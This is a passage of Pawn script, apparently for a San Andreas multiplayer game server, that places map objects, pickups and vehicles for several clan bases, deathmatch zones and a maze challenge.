	CreateStreamObject(16644, -2627.911621, 1418.020630, 22.189287, 0.0000, 354.8434, 18.0482,100);
	CreateStreamObject(13831, -2666.706543, 1319.286499, 61.085426, 0.0000, 0.0000, 90.2409,100);

    //--=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=--
	//--=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=--
 	AddStaticPickup(1240,2,-2654.6697,1424.1563,906.4609);//להביור
   	AddStaticPickup(1242,2,-2660.9309,1424.6766,906.4609);//חיים
   	AddStaticPickup(350,2,-2666.5322,1424.3086,906.4609);//מגן
 	AddStaticPickup(352,2,-2673.4832,1424.6074,906.4609);//דילדו
    //--=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=--

    Move3 = CreateStreamObject(980, -2589.178955, 1352.178223, 8.828062, 0.0000, 0.0000, 223.3495,100);
	Move4 = CreateStreamObject(5837, -2616.550781, 1421.681396, 7.994058, 0.0000, 0.0000, 105.7107,100);

	//--=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=--
    AddStaticVehicle(522,-2674.2964,1451.2795,6.6804,181.6558,0,3); // Nrg
	AddStaticVehicle(522,-2682.7043,1451.4622,6.6738,181.4262,0,86); // Nrg
	AddStaticVehicle(411,-2642.3579,1357.1093,6.8800,270.7258,3,3); // Inferuns
	AddStaticVehicle(425,-2641.2036,1412.9337,24.4620,195.4136,43,0 ); // Hunter
	AddStaticVehicle(520,-2678.2739,1404.7556,24.6200,112.4179,0,0); // Hydra
	AddStaticVehicle(451,-2643.6101,1346.8960,6.8638,270.6218,3,3); // Turismo
	AddStaticVehicle(560,-2643.6685,1336.2522,6.8713,271.7166,33,0); // Sultan
	AddStaticVehicle(409,-2659.3433,1391.5345,6.8937,284.4918,1,1); // Stretch
//=[HM]

    //--=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=--
  	CreateStreamObject(8209, -1289.844360, 434.408020, 9.288527, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(3749, -1507.165283, 471.642609, 12.045915, 0.0000, 0.0000, 269.7591,100);
	CreateStreamObject(987, -1508.003296, 465.295868, 5.937497, 0.0000, 0.0000, 269.7591,100);
	CreateStreamObject(8209, -1455.763550, 481.797302, 9.288527, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(8209, -1390.169434, 481.756073, 9.238520, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(8210, -1301.380127, 481.425781, 9.288527, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(8210, -1261.727417, 481.868347, 9.281942, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(987, -1239.911011, 433.854309, 6.187500, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(987, -1233.848389, 481.562836, 6.187500, 0.0000, 0.0000, 315.3093,100);
	CreateStreamObject(987, -1228.836670, 476.402191, 6.187500, 0.0000, 0.0000, 315.3093,100);
	CreateStreamObject(987, -1220.637939, 467.968994, 6.187500, 0.0000, 0.0000, 269.7591,100);
	CreateStreamObject(987, -1220.582642, 455.966187, 6.187500, 0.0000, 0.0000, 269.7591,100);
	CreateStreamObject(987, -1220.727661, 448.983429, 6.187500, 0.0000, 0.0000, 269.7591,100);
	CreateStreamObject(987, -1218.349121, 440.836456, 6.062500, 0.0000, 0.0000, 218.1929,100);
	CreateStreamObject(987, -1346.638550, 442.280487, 6.180916, 0.0000, 0.0000, 317.8877,100);
	CreateStreamObject(6865, -1510.140015, 471.521484, 14.469392, 0.0000, 0.0000, 314.4499,100);
	CreateStreamObject(13667, -1349.910522, 490.137238, 48.877274, 0.0000, 0.0000, 286.0884,100);
	CreateStreamObject(8483, -1425.990723, 447.639771, 12.568827, 0.0000, 0.0000, 87.6625,100);
	CreateStreamObject(7392, -1453.641846, 490.329102, 25.204449, 0.0000, 0.0000, 85.9437,100);
	CreateStreamObject(7388, -1320.460938, 467.555481, 5.681191, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(3268, -1259.524170, 444.985779, 6.180917, 0.0000, 0.0000, 273.1969,100);
	CreateStreamObject(3268, -1300.637085, 445.898193, 6.187500, 0.0000, 0.0000, 268.8997,100);
	CreateStreamObject(3279, -1226.948364, 464.320282, 6.263117, 0.0000, 0.0000, 179.5182,100);
	CreateStreamObject(13831, -1415.122314, 447.010681, 35.627293, 0.0000, 0.0000, 179.6223,100);
	CreateStreamObject(11395, -1248.841919, 476.097046, 14.251336, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(13011, -1337.208130, 481.057953, 7.945781, 0.0000, 0.0000, 359.1406,100);
	CreateStreamObject(13749, -1324.325684, 479.923126, 10.719633, 0.0000, 0.0000, 325.6225,100);
	CreateStreamObject(1682, -1327.163086, 447.417084, 12.641727, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(14791, -1233.905640, 445.897614, 8.232561, 0.0000, 0.0000, 0.0000,100);
    //--=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=--

	//--=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=--
 	AddStaticPickup(1240,2,-1300.5138,495.8885,11.1953);
   	AddStaticPickup(1242,2,-1300.8835,500.7399,11.1953);
   	AddStaticPickup(325,2,-1304.8390,508.5474,11.1953);
 	AddStaticPickup(371,2,-1310.6023,508.3968,11.1953);
    //--=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=--

    Move7 = CreateStreamObject(980, -1508.946533, 471.620514, 8.960892, 0.0000, 0.0000, 89.3814,100);

	//--=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=--
    AddStaticVehicle(520,-1442.3999,507.4650,18.9556,269.6336,0,0); // hydra
	AddStaticVehicle(522,-1480.2437,463.1314,6.7583,269.2059,0,0); // nrg 1
	AddStaticVehicle(522,-1479.5474,479.3429,6.7659,266.7215,3,3); // nrg2
	AddStaticVehicle(411,-1306.1013,444.9678,6.9146,357.6790,0,0); // Infernus
	AddStaticVehicle(560,-1296.9946,444.8400,6.8862,1.0615,1,1); // sultan
	AddStaticVehicle(487,-1420.2332,494.3921,18.3836,271.0446,0,0); // Maverick
	AddStaticVehicle(431,-1260.8354,448.5393,7.2943,0.4649,0,0); // Bus

	//--=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=--
//=[SEQ]=

    //--=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=--
  	CreateStreamObject(8210, -548.244873, -467.918640, 29.737879, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(8210, -596.329163, -467.552979, 29.640205, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(8210, -623.743652, -496.087708, 29.788527, 0.0000, 0.0000, 89.3814,100);
	CreateStreamObject(8210, -623.607361, -534.831299, 29.958387, 0.0000, 0.0000, 89.3814,100);
	CreateStreamObject(8210, -596.397827, -563.407532, 29.856524, 0.0000, 0.0000, 180.4818,100);
	CreateStreamObject(8210, -541.141541, -562.939819, 29.788527, 0.0000, 0.0000, 180.4818,100);
	CreateStreamObject(8210, -465.697205, -496.132416, 29.733112, 0.0000, 0.0000, 270.7226,100);
	CreateStreamObject(8210, -465.205597, -535.402771, 29.877335, 0.0000, 0.0000, 270.7226,100);
	CreateStreamObject(8210, -493.061310, -467.703125, 29.010010, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(8210, -493.045563, -467.677155, 36.117073, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(8210, -548.247803, -468.171814, 36.957001, 0.0000, 0.0000, 0.8594,100);
	CreateStreamObject(8210, -623.449036, -496.090973, 36.913521, 0.0000, 0.0000, 90.2409,100);
	CreateStreamObject(8210, -624.053711, -534.806152, 36.729866, 0.0000, 0.0000, 90.2409,100);
	CreateStreamObject(3749, -490.547638, -564.721802, 29.966553, 1.7189, 0.0000, 0.0000,100);
	CreateStreamObject(6865, -490.304047, -567.735413, 32.415680, 0.0000, 0.0000, 48.1285,100);
	CreateStreamObject(3279, -509.275970, -556.808533, 24.599054, 0.0000, 0.0000, 90.2409,100);
	CreateStreamObject(9833, -497.832825, -526.713806, 27.725981, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(7388, -613.278259, -549.178833, 36.518967, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(7073, -586.145813, -522.974426, 53.628269, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(1655, -483.230103, -487.062042, 25.817955, 0.0000, 0.0000, 269.7591,100);
	CreateStreamObject(1655, -475.974701, -487.095062, 29.011873, 0.0000, 0.0000, 269.7591,100);
	CreateStreamObject(8251, -610.437561, -482.695190, 28.451252, 0.0000, 0.0000, 0.8594,100);
	CreateStreamObject(14608, -613.754150, -492.930817, 26.119452, 0.0000, 0.0000, 302.4177,100);
	CreateStreamObject(16152, -609.308411, -471.205048, 24.321892, 0.0000, 0.0000, 93.6786,100);
	CreateStreamObject(16151, -621.219177, -480.914032, 24.915190, 0.0000, 2.5783, 184.7789,100);
	CreateStreamObject(13749, -573.415527, -500.261261, 26.987152, 0.0000, 0.0000, 146.8595,100);
	CreateStreamObject(13667, -619.987793, -483.377472, 48.201859, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(14637, -490.421478, -567.971802, 32.677979, 0.0000, 0.0000, 271.4780,100);
	CreateStreamObject(14467, -500.823853, -541.092102, 27.257231, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(13831, -541.798035, -629.133484, 22.821482, 0.0000, 0.0000, 98.8352,100);
	CreateStreamObject(11395, -473.518463, -508.939240, 32.588264, 0.0000, 0.0000, 268.8997,100);
	CreateStreamObject(8644, -504.276459, -519.942932, 30.359245, 0.0000, 0.0000, 210.4578,100);


    //--=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=--
	//--=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=--
 	AddStaticPickup(1240,2,-617.0319,-471.8821,25.5234);
   	AddStaticPickup(1242,2,-620.7642,-486.9237,25.5234);
   	AddStaticPickup(350,2,-603.5403,-471.4846,25.5234);
 	AddStaticPickup(352,2,-608.1075,-493.3950,25.5234);
    //--=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=--

    Move5 = CreateStreamObject(980, -490.520477, -562.596069, 26.996830, 0.0000, 0.0000, 0.0000,100);
	Move6 = CreateStreamObject(972, -600.864380, -484.458282, 22.520319, 0.0000, 0.0000, 0.0000,100);

	//--=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=--
    AddStaticVehicle(522,-529.6472,-501.7393,24.4786,2.0664,1,2); // nrg
	AddStaticVehicle(522,-520.5455,-501.1096,24.5251,0.4041,1,6); // nrg
	AddStaticVehicle(522,-557.6766,-502.6772,24.4014,0.0438,1,44); // nrg
	AddStaticVehicle(560,-471.9119,-518.1224,25.2223,91.5376,1,1); // Sultan
	AddStaticVehicle(411,-538.0913,-544.9603,25.2505,180.0357,1,1); // Infernus
	AddStaticVehicle(520,-519.5393,-523.6187,36.8687,334.9987,0,0); // Hydra
	AddStaticVehicle(425,-536.5164,-523.0582,36.6793,344.7349,43,0); // HuNTER
	//--=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=--
//=[RoX]=

    //--=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=--
  	CreateStreamObject(8209, -6.986244, 41.222534, 5.218215, 0.0000, 0.0000, 66.1766,100);
	CreateStreamObject(8209, -47.331558, -49.780846, 5.185402, 0.0000, 0.0000, 66.1766,100);
	CreateStreamObject(8209, -153.461472, -57.098633, 5.511158, 0.0000, 0.0000, 68.7549,100);
	CreateStreamObject(8209, -128.310059, 8.052116, 5.630454, 0.0000, 0.0000, 68.7549,100);
	CreateStreamObject(8210, -94.607574, 104.703064, 5.863041, 0.0000, 0.0000, 72.1927,100);
	CreateStreamObject(8210, -59.897324, 121.385689, 5.518216, 0.0000, 0.0000, 160.7147,100);
	CreateStreamObject(8210, -9.127243, 99.327248, 5.218215, 0.0000, 0.0000, 151.2609,100);
	CreateStreamObject(8210, -145.095459, -102.580246, 5.218215, 0.0000, 0.0000, 170.1685,100);
	CreateStreamObject(8210, -59.533508, -91.821831, 5.218215, 0.0000, 0.0000, 256.9716,100);
	CreateStreamObject(8210, -79.587479, -113.644592, 5.218215, 0.0000, 0.0000, 171.8873,100);
	CreateStreamObject(3749, -112.226326, -106.623863, 7.967811, 0.0000, 0.0000, 348.8273,100);
	CreateStreamObject(6865, -112.702354, -110.153015, 9.977627, 0.0000, 0.0000, 34.3775,100);
	CreateStreamObject(1655, -79.600380, 113.447800, 4.592300, 18.0482, 0.0000, 341.9518,100);
	CreateStreamObject(1655, -77.827507, 118.821915, 10.257226, 27.5020, 0.0000, 341.9518,100);
	CreateStreamObject(3279, -159.747253, -94.632111, 2.185007, 0.0000, 0.0000, 73.9116,100);
	CreateStreamObject(9833, -101.747910, -65.616928, 5.319731, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(8251, -118.398659, 70.442413, 6.045002, 0.0000, 0.0000, 341.9518,100);
	CreateStreamObject(7388, -92.803200, -43.182430, 10.506157, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(7073, -12.960222, 68.476318, 23.642193, 0.0000, 0.0000, 42.9718,100);
	CreateStreamObject(6965, -81.027527, 43.355309, 5.104651, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(14608, -124.802864, 82.352623, 3.638202, 0.0000, 0.0000, 167.5903,100);
	CreateStreamObject(8492, -106.523987, 66.672508, 11.952303, 0.0000, 0.0000, 37.8152,100);
	CreateStreamObject(8483, -134.202698, -1.125683, 7.748514, 0.0000, 0.0000, 340.2330,100);
	CreateStreamObject(7392, -91.688507, 12.587938, 20.960438, 0.0000, 0.0000, 250.8515,100);
	CreateStreamObject(13831, -16.773039, -24.571260, 10.158543, 0.0000, 0.0000, 247.4137,100);
	CreateStreamObject(11395, -72.674881, -65.850754, 10.187608, 0.0000, 0.0000, 256.8676,100);
	CreateStreamObject(9241, -45.181908, -14.648815, 3.051085, 0.0000, 0.0000, 335.9358,100);
	CreateStreamObject(16151, -120.163483, 59.172073, 2.508940, 0.0000, 0.0000, 251.7109,100);
	CreateStreamObject(14781, -130.473312, 64.526474, 3.207537, 0.0000, 0.0000, 339.3735,100);
	CreateStreamObject(13666, -105.193222, 18.722420, 7.214708, 4.2972, 0.0000, 340.2330,100);
	CreateStreamObject(16776, -106.847916, -23.279804, 1.368031, 0.0000, 0.0000, 339.3735,100);
	CreateStreamObject(3279, -44.874966, 106.973602, 2.192804, 0.0000, 0.0000, 248.2732,100);
	CreateStreamObject(12911, -15.207169, 33.384735, 2.113602, 0.0000, 0.0000, 344.5301,100);
	CreateStreamObject(3528, -115.856270, -91.459305, 4.998580, 0.0000, 0.0000, 353.9839,100);
	CreateStreamObject(3528, -100.834351, -93.053032, 5.423340, 0.0000, 0.0000, 170.1685,100);
	CreateStreamObject(3472, -105.799408, -68.240677, 2.486347, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(3472, -40.618698, 8.407284, 2.486347, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(3472, -98.260460, 80.277802, 2.486347, 0.0000, 0.0000, 0.0000,100);
	CreateStreamObject(3472, -23.868889, 89.756561, 2.486347, 0.0000, 0.0000, 0.0000,100);

    //--=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=--
	//--=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=--
 	AddStaticPickup(361,2,-123.0720,80.2716,3.1172);//להביור
   	AddStaticPickup(1240,2,-127.1314,77.7580,3.1172);//חיים
   	AddStaticPickup(1242,2,-129.5919,70.9728,3.1172);//מגן
 	AddStaticPickup(370,2,-124.6871,60.9731,3.1172);//דילדו
    //--=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=--

    Move1 = CreateStreamObject(980, -112.651115, -108.752769, 4.882787, 0.0000, 0.0000, 169.3091,50);
	Move2 = CreateStreamObject(972, -109.697838, 65.238770, 0.814069, 0.0000, 0.0000, 341.9518,50);

	//--=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=--
    AddStaticVehicle(425,-48.2311,-17.1398,5.4513,65.3948,0,0); // Hunter
	AddStaticVehicle(520,-27.3266,33.8250,3.8442,155.5718,0,0); // Hydra
	AddStaticVehicle(409,-64.3404,39.4631,2.9103,159.7951,1,1); // Stretch
	AddStaticVehicle(522,-96.8882,-54.8726,2.6853,161.3279,0,1); // Nrg
	AddStaticVehicle(487,-42.2420,-6.8481,5.0986,69.6603,86,86); // Maverick
	AddStaticVehicle(451,-30.1336,91.7525,2.8225,166.5291,3,3); // Turismo
	AddStaticVehicle(556,-34.4918,57.0979,3.4902,65.6258,0,0); // Monster
	AddStaticVehicle(406,-60.4035,98.6561,4.6421,246.9427,0,0); // Dumper
	//--=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=----=--=--
//[WDM]=

CreateStreamObject(17864, 3565.107422, -72.666199, 1.119722, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(17864, 3564.589111, -103.484344, 0.894507, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(17864, 3565.266357, -41.376160, 1.612740, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(17864, 3604.033691, -41.594440, 1.900054, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(17864, 3603.184326, -73.053955, 1.547203, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(17864, 3603.536621, -104.362595, 1.064206, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(17864, 3564.474854, -134.274399, 0.605194, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(17864, 3600.346436, -133.626755, 0.899878, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(17864, 3638.706055, -132.332596, 0.963080, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(17864, 3641.221680, -101.716850, 1.361269, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(17864, 3641.235107, -72.689598, 1.707907, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(17864, 3641.754639, -41.590023, 2.243168, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(11556, 3573.297363, -143.210175, 2.862115, 0.0000, 0.0000, 159.7511,100);
CreateStreamObject(11556, 3615.504395, -145.707672, 6.353029, 0.0000, 0.0000, 163.1889,100);
CreateStreamObject(11556, 3638.856934, -145.118683, 7.221710, 0.0000, 0.0000, 172.6427,100);
CreateStreamObject(17864, 3604.163330, -11.774647, 2.392675, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(17864, 3564.591553, -12.113602, 2.093226, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(17864, 3641.569092, -11.630360, 2.595419, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(16119, 3604.303467, 9.792545, -7.780458, 0.0000, 0.0000, 353.1245,100);
CreateStreamObject(17026, 3529.168457, -119.707672, -0.310456, 0.0000, 0.0000, 329.9197,100);
CreateStreamObject(17026, 3529.805420, -73.211517, -0.900542, 0.0000, 0.0000, 318.7470,50);
CreateStreamObject(17026, 3538.820313, -28.011906, -1.656089, 0.0000, 0.0000, 321.3253,50);
CreateStreamObject(17026, 3552.818115, 5.277483, -3.830228, 0.0000, 0.0000, 283.5101,100);
CreateStreamObject(18228, 3677.761963, -24.431198, 4.327888, 0.0000, 0.0000, 250.8515,100);
CreateStreamObject(18228, 3677.345947, -71.621956, 0.554304, 0.0000, 0.0000, 229.3655,100);
CreateStreamObject(18228, 3673.143799, -114.595505, -1.082453, 0.0000, 0.0000, 226.7871,100);
CreateStreamObject(18228, 3666.364258, -145.368744, -3.294925, 0.0000, 0.0000, 197.5664,100);
CreateStreamObject(1681, 3598.250000, -40.157566, 3.048301, 3.4377, 359.1406, 6.8755,100);
CreateStreamObject(2780, 3599.368652, -36.839645, -1.079098, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(11427, 3627.423096, -70.318611, 8.159904, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(11428, 3598.904785, -111.222252, 5.635457, 0.0000, 0.0000, 342.8113,100);
CreateStreamObject(11440, 3570.821289, -74.618996, 0.155321, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(11442, 3570.702393, -33.291355, 1.449009, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(11441, 3604.616943, -21.792389, 2.148845, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(11440, 3624.748779, -38.076344, 0.623179, 0.0000, 0.0000, 321.3253,100);
CreateStreamObject(11428, 3584.232910, -17.765530, 7.213053, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(11443, 3604.962402, -68.427063, 1.290363, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(11458, 3633.992188, -101.399185, 0.660486, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(11459, 3566.380859, -114.498817, 0.169406, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(3243, 3621.019287, -116.876778, 1.249964, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(3243, 3582.995850, -54.149990, 1.407021, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(18267, 3577.192627, -134.160202, 2.676754, 0.0000, 0.0000, 267.1808,100);
CreateStreamObject(18259, 3639.150391, -10.160997, 4.577591, 0.0000, 0.0000, 49.8473,100);
CreateStreamObject(18273, 3601.621582, -51.086582, 19.572086, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(791, 3607.398682, -88.009132, 0.147467, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(791, 3565.853760, -54.455544, 0.485168, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(791, 3608.492676, -10.578110, 0.986912, 0.0000, 0.0000, 0.0000,100);
CreateStreamObject(791, 3643.079834, -123.994186, -0.491456, 0.0000, 0.0000, 0.0000,100);
//=[DM]============================
// Timers
hdmworld[0] = CreateVehicleEx(470,279.8758,1966.2432,17.6163,228.4838,43,0,900000,0,4); // DMpatriot
hdmworld[1] = CreateVehicleEx(470,271.6140,1961.2476,17.6160,251.9060,43,0,900000,0,4); // DMpatriot
hdmworld[2] = CreateVehicleEx(470,272.2895,1949.4794,17.6328,286.0635,43,0,900000,0,4); // DMpatriot
hdmworld[3] = CreateVehicleEx(470,280.4884,1945.6205,17.6380,310.3682,43,0,900000,0,4); // DMpatriot
hdmworld[4] = CreateVehicleEx(433,277.5581,1985.7426,18.1166,270.4214,43,0,900000,0,4); // DMtruck
hdmworld[5] = CreateVehicleEx(433,277.4038,1994.8347,18.1078,267.7369,43,0,900000,0,4); // DMtruck
hdmworld[6] = CreateVehicleEx(425,192.4420,1833.7987,23.8337,271.0974,43,0,900000,0,4); // DMhunter
hdmworld[7] = CreateVehicleEx(425,135.5153,1815.6729,19.1283,266.9278,43,0,900000,0,4); // DMhunter
hdmworld[8] = CreateVehicleEx(425,382.1815,1957.0896,18.1907,10.2006,43,0,900000,0,4); // DMhunter
hdmworld[9] = CreateVehicleEx(425,211.7774,2039.1677,18.7262,188.1466,43,0,900000,0,4); // DMhunter
hdmworld[10] = CreateVehicleEx(520,195.5819,1949.8826,18.3639,181.4313,0,0,900000,0,4); // DMhydra
hdmworld[11] = CreateVehicleEx(520,308.3050,1801.5197,18.5792,179.4952,0,0,900000,0,4); // DMhydra
hdmworld[12] = CreateVehicleEx(520,211.1203,1931.3237,23.9666,90.9087,0,0,900000,0,4); // DMhydra
hdmworld[13] = CreateVehicleEx(520,116.6579,1874.7192,23.1587,180.9988,0,0,900000,0,4); // DMhydra
hdmworld[14] = CreateVehicleEx(407,265.6811,1920.0896,17.8765,56.6894,3,1,900000,0,4); // DMfiretruck


triamountion[0] = CreateVehicleEx(510,981.4656,-2103.0649,4.9210,334.8234,46,46,900000,0,5); // 1
triamountion[1] = CreateVehicleEx(510,978.7773,-2101.8521,4.3309,335.3656,46,46,900000,0,5); // 2
triamountion[2] = CreateVehicleEx(510,976.6324,-2100.8115,3.6917,335.1271,46,46,900000,0,5); // 3
triamountion[3] = CreateVehicleEx(510,974.3834,-2099.7039,3.0017,335.0037,46,46,900000,0,5); // 4
triamountion[4] = CreateVehicleEx(510,971.3785,-2098.1948,2.2598,334.1080,46,46,900000,0,5); // 5
triamountion[5] = CreateVehicleEx(510,968.0189,-2096.5339,1.5786,334.0475,46,46,900000,0,5); // 6
triamountion[6] = CreateVehicleEx(510,965.5646,-2095.3181,1.0807,334.0000,46,46,900000,0,5); // 7
triamountion[7] = CreateVehicleEx(510,962.6918,-2093.8894,0.4980,333.9410,46,46,900000,0,5); // 8
triamountion[8] = CreateVehicleEx(510,984.3466,-2100.8738,5.0505,337.4572,46,46,900000,0,5); // 9
triamountion[9] = CreateVehicleEx(510,986.6360,-2091.7371,4.6063,266.3206,46,46,900000,0,5); // 10

CreateStreamObject(11428,264.097,1857.317,21.744,0.0,0.0,-22.500,500);
CreateStreamObject(11440,120.687,1838.804,16.238,0.0,0.0,101.250,500);

//=[ClanTest]====================================================
CreateStreamObject(8263,1356.981,723.270,12.664,0.0,0.0,-270.000,300);
CreateStreamObject(8263,1357.405,738.720,12.971,0.0,0.0,90.000,300);
CreateStreamObject(8210,1374.922,798.024,13.244,0.0,0.0,0.0,300);
CreateStreamObject(8210,1373.426,663.600,12.929,0.0,0.0,-180.000,300);
CreateStreamObject(8263,1397.361,720.994,12.901,0.0,0.0,-90.000,300);
CreateStreamObject(8263,1397.461,741.938,12.976,0.0,0.0,-90.000,300);

AddStaticPickup(1240,2, 1395.6649,743.0117,10.8203);
AddStaticPickup(1242,2, 1395.6553,736.6987,10.8203);
//=[Challenge]========================
// MAZE

AddStaticPickup(1240,2, 5403.1240,-2286.3423,53.9328);
AddStaticPickup(1240,2, 5373.2090,-2399.8586,45.8001);
AddStaticPickup(1240,2, -4360.8032,93.0207,2.5627);
AddStaticPickup(1240,2, -4411.4004,203.7982,2.1566);
AddStaticPickup(1242,2, -4356.6938,133.9282,2.3596);
AddStaticPickup(1242,2, 5360.4971,-2300.4673,79.4557);
AddStaticPickup(371,2, 5367.5474,-2324.4907,125.2759);
AddStaticPickup(321,2, 5386.7690,-2383.8325,125.6054);
AddStaticPickup(325,2, 5335.5835,-2395.0630,15.7913);
AddStaticPickup(342,15, 5417.3447,-2406.2302,19.8348);
AddStaticPickup(343,15, 5362.6768,-2407.6836,52.8971);
AddStaticPickup(342,15, -4411.5034,204.5394,2.1566);
AddStaticPickup(343,15, -4379.7915,255.0187,1.9776);

CreateStreamObject(8420,-4390.550,267.263,1.001,0.0,0.0,0.0,300);
CreateStreamObject(8420,-4390.695,189.403,1.180,0.0,0.0,-270.000,300);
CreateStreamObject(8420,-4368.341,129.704,1.383,0.0,0.0,-270.000,300);
CreateStreamObject(972,-4377.172,274.632,0.974,0.0,0.0,0.0,300);
CreateStreamObject(972,-4381.714,275.138,0.974,0.0,0.0,0.0,300);
CreateStreamObject(972,-4377.239,250.677,0.974,0.0,0.0,0.0,300);
CreateStreamObject(972,-4391.972,259.765,0.974,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4381.140,242.397,0.982,0.0,0.0,0.0,300);
CreateStreamObject(972,-4392.624,267.828,1.131,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4410.347,250.241,1.178,0.0,0.0,0.0,300);
CreateStreamObject(972,-4398.410,267.765,1.131,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4405.713,242.169,0.974,0.0,0.0,0.0,300);
CreateStreamObject(972,-4413.843,239.413,-0.018,0.0,0.0,1.719,300);
CreateStreamObject(972,-4413.088,226.515,1.161,0.0,0.0,-11.250,300);
CreateStreamObject(972,-4408.642,220.464,1.153,0.0,3.438,-11.250,300);
CreateStreamObject(972,-4414.273,214.354,1.161,0.0,0.0,-135.000,300);
CreateStreamObject(972,-4409.452,214.249,1.153,0.0,0.0,-11.250,300);
CreateStreamObject(972,-4422.199,232.539,0.164,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4433.798,214.641,0.231,0.0,0.0,0.0,300);
CreateStreamObject(972,-4421.187,208.749,1.153,0.0,0.0,-168.750,300);
CreateStreamObject(972,-4424.604,173.029,1.153,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4417.852,183.551,1.153,0.0,0.0,-180.000,300);
CreateStreamObject(972,-4427.101,194.408,1.153,0.0,0.0,-180.000,300);
CreateStreamObject(972,-4427.324,181.575,1.153,0.0,0.0,-180.000,300);
CreateStreamObject(972,-4418.795,194.964,1.153,0.0,0.0,-11.250,300);
CreateStreamObject(972,-4416.069,179.689,1.153,0.0,0.0,0.0,300);
CreateStreamObject(972,-4411.589,187.788,1.153,0.0,0.0,22.500,300);
CreateStreamObject(972,-4407.750,172.710,1.357,0.0,0.0,33.750,300);
CreateStreamObject(972,-4394.445,168.740,1.356,0.0,0.0,56.250,300);
CreateStreamObject(972,-4393.897,161.967,1.364,0.0,0.0,45.000,300);
CreateStreamObject(972,-4390.427,163.356,1.364,0.0,0.0,-127.188,300);
CreateStreamObject(972,-4389.773,159.434,1.319,0.0,0.0,50.234,300);
CreateStreamObject(972,-4384.180,157.283,1.356,0.0,0.0,23.359,300);
CreateStreamObject(972,-4384.991,138.799,1.559,0.0,0.0,0.0,300);
CreateStreamObject(972,-4380.014,142.691,1.356,0.0,0.0,0.0,300);
CreateStreamObject(972,-4373.674,131.609,1.356,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4375.379,139.044,1.356,0.0,0.0,0.0,300);
